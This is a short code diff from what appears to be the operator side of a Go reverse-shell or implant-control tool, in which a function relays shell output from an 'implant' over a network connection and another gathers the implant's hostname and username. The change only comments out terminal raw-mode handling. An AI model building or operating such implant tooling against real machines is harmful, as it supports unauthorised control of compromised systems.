@@ -130,11 +130,11 @@ func startShell(conn net.Conn) {
 	}
 	defer ttwhy.Close()
 
-	unraw, err := ttwhy.Raw()
-	if err != nil {
-		log.Error(err)
-	}
-	defer unraw()
+	// unraw, err := ttwhy.Raw()
+	// if err != nil {
+	// 	log.Error(err)
+	// }
+	// defer unraw()
 
 	// continuously print shell stdout coming from the implant
 	go func() { io.Copy(ttwhy.Output(), conn) }()
@@ -179,7 +179,6 @@ func genTempFilename(username string) (string, error) {
 }
 
 func prepareTmux(conn net.Conn) (string, error) {
-
 	hostname, username, err := implantInfo(conn)
 	if err != nil {
 		return "", fmt.Errorf("failed getting implant info: %w", err)
